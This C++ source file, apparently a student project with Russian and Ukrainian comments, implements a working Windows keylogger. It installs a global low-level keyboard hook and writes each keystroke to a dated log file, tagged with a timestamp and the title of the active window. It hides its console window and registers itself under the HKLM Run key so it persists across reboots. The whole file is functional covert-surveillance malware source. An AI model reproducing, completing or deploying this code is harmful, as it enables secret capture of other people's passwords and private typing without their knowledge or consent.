// KL.cpp : Defines the entry point for the console application.
//
#include "stdafx.h"
#include <windows.h>
#include <iostream>
#include <time.h>   
#include <TCHAR.H>
#include <wchar.h>
#include <stdio.h>
#include <utility>

#define MAX_BUFSIZE 127
#define MAX_MODULE_NAME 254

TCHAR		g_buf[ MAX_BUFSIZE ];
HANDLE		g_file;
BYTE		g_keyState[ 254 ];
DWORD		g_winID = NULL;
TCHAR		g_path[ MAX_PATH ];
HINSTANCE	g_instance;
HWND		g_activeWindow;
DWORD		g_prevWinID = NULL;
TCHAR		g_moduleName[ MAX_MODULE_NAME ];


void Stealth(int num)		// Входные параметры - 1 или 0
{
	HWND Stealth;			// hwnd главного окна
	AllocConsole();			// Выделяем новую консоль для вызывающего процесса
	Stealth = FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(Stealth,num);// 0 -Hides the window 
}

int SaveProfileAdv ( TCHAR *millibuffer, int nxtkey_stroke,SYSTEMTIME st )
{
	TCHAR milliTImeStamp[] = TEXT( "%02d:%02d:%02d:%02d  -> %s  \n" );
	if ( nxtkey_stroke == VK_F1 )
		_stprintf( millibuffer, milliTImeStamp,st.wHour, st.wMinute,st.wSecond,st.wMilliseconds, TEXT( "[F1]" ) );
	else if ( nxtkey_stroke == VK_F2 )
		_stprintf( millibuffer, milliTImeStamp,st.wHour, st.wMinute,st.wSecond,st.wMilliseconds, TEXT( "[F2]" ) );
	else if ( nxtkey_stroke == VK_F3 )
		_stprintf( millibuffer, milliTImeStamp,st.wHour, st.wMinute,st.wSecond,st.wMilliseconds, TEXT( "[F3]" ) );
	else if ( nxtkey_stroke == VK_F4 )
		_stprintf( millibuffer, milliTImeStamp,st.wHour, st.wMinute,st.wSecond,st.wMilliseconds, TEXT( "[F4]" ) );
	else if ( nxtkey_stroke == VK_F5 )
		_stprintf( millibuffer, milliTImeStamp,st.wHour, st.wMinute,st.wSecond,st.wMilliseconds, TEXT( "[F5]" ) );
	else if ( nxtkey_stroke == VK_F6 )
		_stprintf( millibuffer, milliTImeStamp,st.wHour, st.wMinute,st.wSecond,st.wMilliseconds, TEXT( "[F6]" ) );
	else if ( nxtkey_stroke == VK_F7 )
		_stprintf( millibuffer, milliTImeStamp,st.wHour, st.wMinute,st.wSecond,st.wMilliseconds, TEXT( "[F7]" ) );
	else if ( nxtkey_stroke == VK_F8 )
		_stprintf( millibuffer, milliTImeStamp,st.wHour, st.wMinute,st.wSecond,st.wMilliseconds, TEXT( "[F8]" ) );
	else if ( nxtkey_stroke == VK_F9 )
		_stprintf( millibuffer, milliTImeStamp,st.wHour, st.wMinute,st.wSecond,st.wMilliseconds, TEXT( "[F9]" ) );
	else if ( nxtkey_stroke == VK_F10 )
		_stprintf( millibuffer, milliTImeStamp,st.wHour, st.wMinute,st.wSecond,st.wMilliseconds, TEXT( "[F10]" ) );
	else if ( nxtkey_stroke == VK_F11 )
		_stprintf( millibuffer, milliTImeStamp,st.wHour, st.wMinute,st.wSecond,st.wMilliseconds, TEXT( "[F11]" ) );
	else if ( nxtkey_stroke == VK_F12 )
		_stprintf( millibuffer, milliTImeStamp,st.wHour, st.wMinute,st.wSecond,st.wMilliseconds, TEXT( "[F12]" ) );
	else if ( nxtkey_stroke == 8 )
		_stprintf( millibuffer, milliTImeStamp,st.wHour, st.wMinute,st.wSecond,st.wMilliseconds, TEXT( "[BACKSPACE]" ) );  
	else if ( nxtkey_stroke == 13 )
		_stprintf( millibuffer, milliTImeStamp,st.wHour, st.wMinute,st.wSecond,st.wMilliseconds, TEXT( "[ENTER]" ) ); 
	else if ( nxtkey_stroke == 32 )
		_stprintf( millibuffer, milliTImeStamp,st.wHour, st.wMinute,st.wSecond,st.wMilliseconds, TEXT( "[SPACE]" ) );
	else if ( nxtkey_stroke == VK_TAB )             
		_stprintf( millibuffer, milliTImeStamp,st.wHour, st.wMinute,st.wSecond,st.wMilliseconds, TEXT( "[TAB]" ) );
	else if ( nxtkey_stroke == VK_LSHIFT )
		_stprintf( millibuffer, milliTImeStamp,st.wHour, st.wMinute,st.wSecond,st.wMilliseconds, TEXT( "[L_SHIFT]" ) );
	else if ( nxtkey_stroke == VK_LCONTROL )
		_stprintf( millibuffer, milliTImeStamp,st.wHour, st.wMinute,st.wSecond,st.wMilliseconds, TEXT( "[L_CONTROL]" ) );
	else if ( nxtkey_stroke == VK_RCONTROL )
		_stprintf( millibuffer, milliTImeStamp,st.wHour, st.wMinute,st.wSecond,st.wMilliseconds, TEXT( "[R_CONTROL]" ) );
	else if ( nxtkey_stroke == VK_RSHIFT )
		_stprintf( millibuffer, milliTImeStamp,st.wHour, st.wMinute,st.wSecond,st.wMilliseconds, TEXT( "[R_SHIFT]" ) );
	else if ( nxtkey_stroke == VK_CAPITAL )
		_stprintf( millibuffer, milliTImeStamp,st.wHour, st.wMinute,st.wSecond,st.wMilliseconds, TEXT( "[CAPSLOCK]" ) );
	else if ( nxtkey_stroke == VK_NUMLOCK )
		_stprintf( millibuffer, milliTImeStamp,st.wHour, st.wMinute,st.wSecond,st.wMilliseconds, TEXT( "[NUM_LOCK]" ) );
	else if ( nxtkey_stroke == VK_SCROLL )
		_stprintf( millibuffer, milliTImeStamp,st.wHour, st.wMinute,st.wSecond,st.wMilliseconds, TEXT( "[SCROLL_LOCK]" ) );
	else if ( nxtkey_stroke == 255 )
		_stprintf( millibuffer, milliTImeStamp,st.wHour, st.wMinute,st.wSecond,st.wMilliseconds, TEXT( "[FN_LOCK]" ) );
	else if ( nxtkey_stroke == VK_INSERT )
		_stprintf( millibuffer, milliTImeStamp,st.wHour, st.wMinute,st.wSecond,st.wMilliseconds, TEXT( "[INSERT]" ) );
	else if ( nxtkey_stroke == VK_LWIN )
		_stprintf( millibuffer, milliTImeStamp,st.wHour, st.wMinute,st.wSecond,st.wMilliseconds, TEXT( "[LWIN]" ) );
	else if ( nxtkey_stroke == VK_RWIN )
		_stprintf( millibuffer, milliTImeStamp,st.wHour, st.wMinute,st.wSecond,st.wMilliseconds, TEXT( "[RWIN]" ) );
	else if ( nxtkey_stroke == VK_PRIOR )
		_stprintf( millibuffer, milliTImeStamp,st.wHour, st.wMinute,st.wSecond,st.wMilliseconds, TEXT( "[PGDN]" ) );
	else if ( nxtkey_stroke == VK_NEXT )
		_stprintf( millibuffer, milliTImeStamp,st.wHour, st.wMinute,st.wSecond,st.wMilliseconds, TEXT( "[PGUP]" ) );
	else if ( nxtkey_stroke == VK_RMENU || nxtkey_stroke == VK_MENU  )
		_stprintf( millibuffer, milliTImeStamp,st.wHour, st.wMinute,st.wSecond,st.wMilliseconds, TEXT( "[R_ALT]" ) );
	else if ( nxtkey_stroke == VK_LMENU || nxtkey_stroke == VK_MENU )
		_stprintf( millibuffer, milliTImeStamp,st.wHour, st.wMinute,st.wSecond,st.wMilliseconds, TEXT( "[L_ALT]" ) );
	else if ( nxtkey_stroke == VK_ESCAPE )
		_stprintf( millibuffer, milliTImeStamp,st.wHour, st.wMinute,st.wSecond,st.wMilliseconds, TEXT( "[ESCAPE]" ) );
	else if ( nxtkey_stroke == VK_END )
		_stprintf( millibuffer, milliTImeStamp,st.wHour, st.wMinute,st.wSecond,st.wMilliseconds, TEXT( "[END]" ) );
	else if ( nxtkey_stroke == VK_HOME )
		_stprintf( millibuffer, milliTImeStamp,st.wHour, st.wMinute,st.wSecond,st.wMilliseconds, TEXT( "[HOME]" ) );
	else if ( nxtkey_stroke == VK_LEFT )
		_stprintf( millibuffer, milliTImeStamp,st.wHour, st.wMinute,st.wSecond,st.wMilliseconds, TEXT( "[LEFT]" ) );
	else if ( nxtkey_stroke == VK_UP )
		_stprintf( millibuffer, milliTImeStamp,st.wHour, st.wMinute,st.wSecond,st.wMilliseconds, TEXT( "[UP]" ) );
	else if ( nxtkey_stroke == VK_RIGHT )
		_stprintf( millibuffer, milliTImeStamp,st.wHour, st.wMinute,st.wSecond,st.wMilliseconds, TEXT( "[RIGHT]" ) );
	else if ( nxtkey_stroke == VK_DOWN )
		_stprintf( millibuffer, milliTImeStamp,st.wHour, st.wMinute,st.wSecond,st.wMilliseconds, TEXT( "[DOWN]" ) );
	else if ( nxtkey_stroke == VK_SLEEP )
		_stprintf( millibuffer, milliTImeStamp,st.wHour, st.wMinute,st.wSecond,st.wMilliseconds, TEXT( "[SLEEP]" ) );
	else if ( nxtkey_stroke == VK_NUMPAD0 )
		_stprintf( millibuffer, milliTImeStamp,st.wHour, st.wMinute,st.wSecond,st.wMilliseconds, TEXT( "[NUMP_0]" ) );
	else if ( nxtkey_stroke == VK_NUMPAD1 )
		_stprintf( millibuffer, milliTImeStamp,st.wHour, st.wMinute,st.wSecond,st.wMilliseconds, TEXT( "[NUMP_1]" ) );
	else if ( nxtkey_stroke == VK_NUMPAD2 )
		_stprintf( millibuffer, milliTImeStamp,st.wHour, st.wMinute,st.wSecond,st.wMilliseconds, TEXT( "[NUMP_2]" ) );
	else if ( nxtkey_stroke == VK_NUMPAD3 )
		_stprintf( millibuffer, milliTImeStamp,st.wHour, st.wMinute,st.wSecond,st.wMilliseconds, TEXT( "[NUMP_3]"));
	else if ( nxtkey_stroke == VK_NUMPAD4 )
		_stprintf( millibuffer, milliTImeStamp,st.wHour, st.wMinute,st.wSecond,st.wMilliseconds, TEXT( "[NUMP_4]" ) );
	else if ( nxtkey_stroke == VK_NUMPAD5 || nxtkey_stroke == 12 )
		_stprintf( millibuffer, milliTImeStamp,st.wHour, st.wMinute,st.wSecond,st.wMilliseconds, TEXT( "[NUMP_5]" ) );
	else if ( nxtkey_stroke == VK_NUMPAD6 )
		_stprintf( millibuffer, milliTImeStamp,st.wHour, st.wMinute,st.wSecond,st.wMilliseconds, TEXT( "[NUMP_6]" ) );
	else if ( nxtkey_stroke == VK_NUMPAD7 )
		_stprintf( millibuffer, milliTImeStamp,st.wHour, st.wMinute,st.wSecond,st.wMilliseconds, TEXT( "[NUMP_7]" ) );
	else if ( nxtkey_stroke == VK_NUMPAD8 )
		_stprintf( millibuffer, milliTImeStamp,st.wHour, st.wMinute,st.wSecond,st.wMilliseconds, TEXT( "[NUMP_8]" ) );
	else if ( nxtkey_stroke == VK_NUMPAD9 )
		_stprintf( millibuffer, milliTImeStamp,st.wHour, st.wMinute,st.wSecond,st.wMilliseconds, TEXT( "[NUMP_9]" ) );
	else if ( nxtkey_stroke == VK_APPS )
		_stprintf( millibuffer, milliTImeStamp,st.wHour, st.wMinute,st.wSecond,st.wMilliseconds, TEXT( "[APPLICATION_KEY]" ) );
	else if ( nxtkey_stroke == VK_SNAPSHOT )
		_stprintf( millibuffer, milliTImeStamp,st.wHour, st.wMinute,st.wSecond,st.wMilliseconds, TEXT( "[PRINT_SCREEN]" ) );
	else if ( nxtkey_stroke == VK_DELETE )
		_stprintf( millibuffer, milliTImeStamp,st.wHour, st.wMinute,st.wSecond,st.wMilliseconds, TEXT( "[DELETE]" ) );
	else if ( nxtkey_stroke == VK_MULTIPLY )
		_stprintf( millibuffer, milliTImeStamp,st.wHour, st.wMinute,st.wSecond,st.wMilliseconds, TEXT( "*" ) );
	else if ( nxtkey_stroke == VK_ADD )
		_stprintf( millibuffer, milliTImeStamp,st.wHour, st.wMinute,st.wSecond,st.wMilliseconds, TEXT( "+" ) );
	else if ( nxtkey_stroke == VK_SEPARATOR )
		_stprintf( millibuffer, milliTImeStamp,st.wHour, st.wMinute,st.wSecond,st.wMilliseconds, TEXT( "[Del]" ) );
	else if ( nxtkey_stroke == VK_SUBTRACT )
		_stprintf( millibuffer, milliTImeStamp,st.wHour, st.wMinute,st.wSecond,st.wMilliseconds, TEXT( "-" ) );
	else if ( nxtkey_stroke == VK_DECIMAL )
		_stprintf( millibuffer, milliTImeStamp,st.wHour, st.wMinute,st.wSecond,st.wMilliseconds, TEXT( "." ) );
	else if ( nxtkey_stroke == VK_DIVIDE )
		_stprintf( millibuffer, milliTImeStamp,st.wHour, st.wMinute,st.wSecond,st.wMilliseconds, TEXT( "/" ) );
	else if ( nxtkey_stroke == 186 )
		_stprintf( millibuffer, milliTImeStamp,st.wHour, st.wMinute,st.wSecond,st.wMilliseconds, TEXT( "; or :" ) );
	else if ( nxtkey_stroke == 187 )
		_stprintf( millibuffer, milliTImeStamp,st.wHour, st.wMinute,st.wSecond,st.wMilliseconds, TEXT( "= or +" ) );
	else if ( nxtkey_stroke == 188 )
		_stprintf( millibuffer, milliTImeStamp,st.wHour, st.wMinute,st.wSecond,st.wMilliseconds, TEXT( ", or <" ) );
	else if ( nxtkey_stroke == 189 )
		_stprintf( millibuffer, milliTImeStamp,st.wHour, st.wMinute,st.wSecond,st.wMilliseconds, TEXT( "- or _" ) );
	else if ( nxtkey_stroke == 190 || nxtkey_stroke == 110 )
		_stprintf( millibuffer, milliTImeStamp,st.wHour, st.wMinute,st.wSecond,st.wMilliseconds, TEXT( ". or >" ) );
	else if ( nxtkey_stroke == 191 )
		_stprintf( millibuffer, milliTImeStamp,st.wHour, st.wMinute,st.wSecond,st.wMilliseconds, TEXT( "? or /" ) );
	else if ( nxtkey_stroke == 192 )
		_stprintf( millibuffer, milliTImeStamp,st.wHour, st.wMinute,st.wSecond,st.wMilliseconds, TEXT( "` or ~" ) );
	else if ( nxtkey_stroke == 219 )
		_stprintf( millibuffer, milliTImeStamp,st.wHour, st.wMinute,st.wSecond,st.wMilliseconds, TEXT( "[ Or {" ) );
	else if ( nxtkey_stroke == 220 )
		_stprintf( millibuffer, milliTImeStamp,st.wHour, st.wMinute,st.wSecond,st.wMilliseconds, TEXT( "\\ or |" ) );
	else if ( nxtkey_stroke == 221 )
		_stprintf( millibuffer, milliTImeStamp,st.wHour, st.wMinute,st.wSecond,st.wMilliseconds, TEXT( "] or }" ) );
	else if ( nxtkey_stroke == 222 )
		_stprintf( millibuffer, milliTImeStamp,st.wHour, st.wMinute,st.wSecond,st.wMilliseconds, TEXT( "' or ''") );
	else
		_stprintf( millibuffer, milliTImeStamp,st.wHour, st.wMinute,st.wSecond,st.wMilliseconds, &nxtkey_stroke );
	return 0;
}


BOOL extractChar( const DWORD vkCode, const DWORD scanCode, LPWORD ch )
{	// Записывает в ch переведенные коды клавиш
	// vkCode,scanCode - код, который будет переведен
	GetKeyboardState( g_keyState );
	// 2 - т.к. обрабатываем 2 байтовые символы
	return ToAsciiEx( vkCode, scanCode, g_keyState, ch, 0, GetKeyboardLayout( g_winID ) ) == 2;
} 

LRESULT CALLBACK LLKeyProc( int nCode, WPARAM wParam, LPARAM lParam )
{
	TCHAR space[] = TEXT( "  " );
	TCHAR slashN[] = TEXT( "\n" );
	TCHAR slashNAddit[] = TEXT( " \n" );
	TCHAR slashRNAddit[] = TEXT( " \r\n" );
	TCHAR unknownPlusSlashN[] = TEXT( " [unknown]\r\n" );

	
	
	if ( ( nCode == HC_ACTION ) && ( wParam == WM_KEYDOWN )	)
	{
		SYSTEMTIME st;
		DWORD written;

		// вытягиваем поле из структуры  
        DWORD vk = ( ( LPKBDLLHOOKSTRUCT )lParam )->vkCode;			// lParam - указатель на структуру типа KBDLLHOOKSTRUCT,
																	// в которой есть несколько полей, в том числе vkCode
		DWORD sk = ( ( LPKBDLLHOOKSTRUCT )lParam )->scanCode;

		g_activeWindow = GetForegroundWindow( );						// выбираем хэндл рабочего окна
		GetWindowThreadProcessId( g_activeWindow, &g_winID );			// получаем id хэндла работающего окна
		if ( g_winID != g_prevWinID )								
		{
			g_prevWinID = g_winID;									// запоминаем id текущего окна
			GetWindowText( g_activeWindow, g_moduleName, MAX_MODULE_NAME );// запоминаем имя модуля в переменную
			_tcscat( g_moduleName, space );							// после имени возврат корретки
			WriteFile( g_file, g_moduleName, _tcslen( g_moduleName )*sizeof( TCHAR ), &written, NULL );
			_tcscpy( g_buf, slashNAddit );
																	// запись в файл с хэндлом g_file информации из буффера g_moduleName
																	// длина записи - размер буфера. Записуется все в буффер written
		}
		GetLocalTime( &st );
        //std::cout << "key pressed : " << vk << std::endl;
		//pairArr[vk].first=st.wMilliseconds;
		//pairArr[vk].second=pairArr[vk].second+1; 
		TCHAR * tmpbuf = g_buf;
		SaveProfileAdv( tmpbuf, vk, st );
		_tcscat( tmpbuf, slashRNAddit );
		WriteFile( g_file, tmpbuf, _tcslen( tmpbuf )*sizeof( TCHAR ), &written, NULL );
		if( vk == 0x1b )	//	Клавіша ESC Esc 27 0x1b  VK_ESCAPE
		{
			// Функция говорит Windows, что поток отправил запрос на завершение (quit)
            PostQuitMessage(0);
		}
    }
	// Передает информацию хука до следующей процедуры в цепи хуков
    return CallNextHookEx( NULL, nCode, wParam, lParam );
}

bool createNewLogFile( )
{
	SYSTEMTIME st;
	GetLocalTime( &st );
	GetDateFormat( LOCALE_SYSTEM_DEFAULT, 0, &st, _T( "dd.MM.yy" ), g_path, MAX_PATH );
	TCHAR * ptrAfterSyl_ = g_path + _tcslen( g_path ) + 2;
	_tcscat( g_path, _T( "_1.txt" ) );

	DWORD fileNum = 2;
	g_file = CreateFile( g_path, GENERIC_WRITE, NULL, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL );
	while ( GetLastError( ) == ERROR_FILE_EXISTS )
	{
		wsprintf( ptrAfterSyl_, _T( "%d" ), fileNum );
		_tcscat( g_path, _T( ".txt" ) );
		g_file = CreateFile( g_path, GENERIC_WRITE, NULL, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL );
		if ( ++fileNum == 0 )
			return false;
	}
	return g_file != INVALID_HANDLE_VALUE;
}

int main()
{	
//--------------------------------------------------------
//	Модуль запуска программы в автозагрузку через реестр
//--------------------------------------------------------
	HKEY hKey;
	LONG hr = RegOpenKeyEx( HKEY_LOCAL_MACHINE, _T( "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" ),0, KEY_ALL_ACCESS, &hKey );
	
	if ( hr == ERROR_SUCCESS )
	{
		RegSetValueEx( hKey, _T( "KL.exe" ), 0, REG_SZ, ( CONST BYTE* )_T( "E:\\8_sem\\RW\\KL\\KL.exe" ), sizeof( _T( "E:\\8_sem\\RW\\KL\\KL.exe" ) ) );
		RegCloseKey(hKey);
	}
//--------------------------------------------------------
	HANDLE mutex = CreateMutex(NULL, FALSE, _T( "KeyboardLogger" ) );
	if ( GetLastError( ) == ERROR_ALREADY_EXISTS || GetLastError( ) == ERROR_ACCESS_DENIED ) return 1;
	if ( !createNewLogFile( ) )
	{
		ReleaseMutex( mutex );
		return 1;
	}
	Stealth( 0 );
	// Система вызывает эту функцию как только появляется клавиатурное событие, которое вот-вот будет размещено в очереди потока ввода
    HHOOK hook = SetWindowsHookEx( WH_KEYBOARD_LL, LLKeyProc, GetModuleHandle( NULL ), 0 );
    if( hook )
    {
        while( WaitMessage( ) )
        {
            MSG msg = {0};
			// PeekMessage - отправляет поступающие отправленные сообщения, проверяет поток очереди сообщений
			// для опубликованного сообщения и извлекает сообщение, если оно существует
			//GetMessage(&msg, 0, 0, 0)
            while( PeekMessage( &msg, NULL, 0, 0, PM_REMOVE ) )
			// PM_REMOVE указывает, что сообщения убираются из очереди после обработки функцией PeekMessage
            {
				// &msg - Указатель на MSG структуру, принимающую информацию о сообщении
				/*	typedef struct tagMSG {
					HWND   hwnd;
					UINT   message;
					WPARAM wParam;
					LPARAM lParam;
					DWORD  time;
					POINT  pt;
					} MSG, *PMSG, *LPMSG;
				*/
				// Если обнаружено PostQuitMessage(0), то анхукаем окно и заканчиваем работу
				// В дальнейшем мы видоизменим эту опцию
                if ( msg.message == WM_QUIT )
                {
                    UnhookWindowsHookEx( hook );
                    return 0;
                }
				TranslateMessage( &msg );	// Переводим сообщения виртуальной клавиатуры в символьный вид
				DispatchMessage( &msg );	// Отправляет сообщение в оконную процедуру 
            }
        }
    }
	ReleaseMutex( mutex );
	UnhookWindowsHookEx( hook );
	CloseHandle( g_file );

	if ( !hook )
	{
		ReleaseMutex( mutex );
		CloseHandle( g_file );
		return 1;
	}
    return 0;
}